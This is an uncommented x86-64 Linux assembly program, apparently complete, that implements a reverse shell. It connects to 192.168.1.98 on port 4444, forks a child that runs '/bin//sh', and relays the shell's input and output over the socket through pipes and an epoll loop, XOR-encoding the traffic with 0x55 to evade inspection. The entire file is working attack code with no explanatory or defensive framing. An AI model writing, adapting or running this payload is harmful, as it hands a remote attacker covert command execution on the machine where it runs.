section .text
global _start

_start:
xor rax, rax 
add rax, 41
xor rdi, rdi
add rdi, 2
xor rsi, rsi
add rsi, 1
xor rdx, rdx
syscall
js ex
xor r15, r15
add r15d, eax

xor rax, rax
push rax
push rsp
mov word [rsp], 0x0002
mov word [rsp + 2], 0X5C11 
mov word [rsp + 4], 0xA8C0
mov word [rsp + 6], 0x6201

add rax, 42
xor rdi, rdi
add edi, r15d
mov rsi, rsp
xor rdx, rdx 
add rdx, 16
syscall
cmp rax, 0
add rsp, 8
js ex
xor r14, r14
xor r13, r13


push rsp

xor rax, rax
add rax, 293
mov rdi, rsp
xor rsi, rsi
add rsi, 0x80000
syscall
cmp rax, 0

mov dword r13d, [rsp]
mov dword r14d, [rsp + 4]
js ex

add rsp, 8

push rsp

xor rax, rax
add rax, 293
mov rdi, rsp
xor rsi, rsi
add rsi, 0x80000

syscall
cmp rax, 0
js ex 

mov dword r12d, [rsp]
mov dword r10d, [rsp + 4]

add rsp, 8

xor rax, rax
add rax, 33
xor rdi, rdi
add edi, r13d
xor rsi, rsi
syscall
cmp rax, 0
js ex


xor rax, rax
add rax, 33
xor rdi, rdi
add edi, r10d
xor rsi, rsi
add rsi, 1
syscall
cmp rax, 1
js ex 


xor rax, rax
add rax, 33
xor rdi, rdi
add edi, r10d
xor rsi, rsi
add rsi, 2
syscall
cmp rax, 0
js ex 


xor rax, rax
add rax, 57
syscall
cmp rax, 0
js ex
je child
jg parent

child:


xor rax, rax
push rsp
mov dword [rsp], 0x69622f2f
mov dword [rsp + 4], 0x68732f6e



xor rax, rax

add rax, 59
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
js ex
add rsp, 8
parent:


xor rax, rax
add rax, 291
xor rdi, rdi
syscall 
js ex
xor r13, r13
add r13, rax


xor rdx, rdx
xor rsi, rsi
add dword esi, 0x01 
sub rsp, 16
mov dword [rsp], esi
mov dword [rsp + 4], edx
mov qword [rsp + 8], r12


xor rax, rax
add rax, 233
xor rdi, rdi
add rdi, r13
xor rsi, rsi
add rsi, 1
xor rdx, rdx
add edx, r12d
mov r10, rsp
syscall
cmp rax, 0
js ex

add rsp, 16
xor rdx, rdx
xor rsi, rsi

add dword esi, 0x01
sub rsp, 16
mov dword [rsp], esi
mov dword [rsp + 4], edx
mov qword [rsp + 8], r15

xor rax, rax
add rax, 233
xor rsi, rsi
add rsi, 1
xor rdx, rdx
add edx, r15d
mov r10, rsp
syscall
cmp rax, 0
js ex
add rsp, 16
jmp fd_wait

clean_1024:

mov r8, 8
imul r9, r8
mov qword [rsp + r9], 0
cmp r9, rbx
jl continue_1024

add rsp, 1024
jmp fd_wait

clean_page:

mov byte [rsp + rdx], 0
cmp rdx, rax
jl continue_page

add rsp, 4096
jmp fd_wait

continue_1024:
inc r9
jmp clean_1024

continue_page:
inc rdx
jmp clean_page

fd_wait:
sub rsp, 1024

xor rax, rax
add rax, 232
xor rdi, rdi
add rdi, r13
mov rsi, rsp
xor rdx, rdx
add rdx, 64
xor r10, r10
add r10, 1
syscall
xor rbx, rbx
cmp rax, 0
js ex
mov r9, 0
mov rcx, 0 
jg handle_loop
je clean_1024

handle_loop:
mov rbx, 16
imul rbx, rcx
mov rsi, 0x08
add rsi, rbx
inc rcx
mov qword rdx, [rsp + rsi]
cmp rdx, r15
je sock_fd

cmp rdx, r12
je pipe2_rdsh

cmp rcx, rax
jl handle_loop
xor r9, r9
jmp clean_1024

sock_fd:
cmp dword [rsp + rbx], 0x01
je rd_sock
xor r9, r9
jmp clean_1024


pipe2_rdsh:
cmp dword [rsp + rbx], 0x01
je rd_sh
xor r9, r9
jmp clean_1024


rd_sock:
add rsp, 1024
sub rsp, 4096
xor rax, rax
xor rdx, rdx
xor rdi, rdi
add edi, r15d
mov rsi, rsp
add rdx, 4096
syscall
xor rcx, rcx
xor r10, r10
add rcx, rax
xor rdx, rdx
cmp rax, 0
je clean_page
js ex
jne xor_crypt

wr_sh:
xor rax, rax
add rax, 1
xor rdi, rdi
add edi, r14d
xor rdx, rdx
add rdx, rcx
syscall
xor rdx, rdx
cmp rax, 0

jg clean_page
je clean_page
jmp ex


rd_sh: 
add rsp, 1024
sub rsp, 4096
xor rax, rax
xor rdi, rdi
mov rdx, 4096
add edi, r12d
mov rsi, rsp
syscall
xor r10, r10
xor rcx, rcx
add rcx, rax
xor rdx, rdx
cmp rax, 0

js ex
je clean_page
jne xor_crypt

wr_sock:
xor rax, rax
add rax, 1
mov rsi, rsp
xor rdi, rdi
add edi, r15d 
xor rdx, rdx
add rdx, rcx
syscall
xor rdx, rdx
cmp rax, 0

je clean_page
js ex
jmp clean_page


xor_crypt:
xor byte [rsp + r10], 0x55
inc r10
cmp r10, rcx
jl xor_crypt
cmp edi, r15d
je wr_sh
jmp wr_sock


ex:
xor rsi, rsi
add rsi, rax
xor rax, rax
add rax, 60
syscall
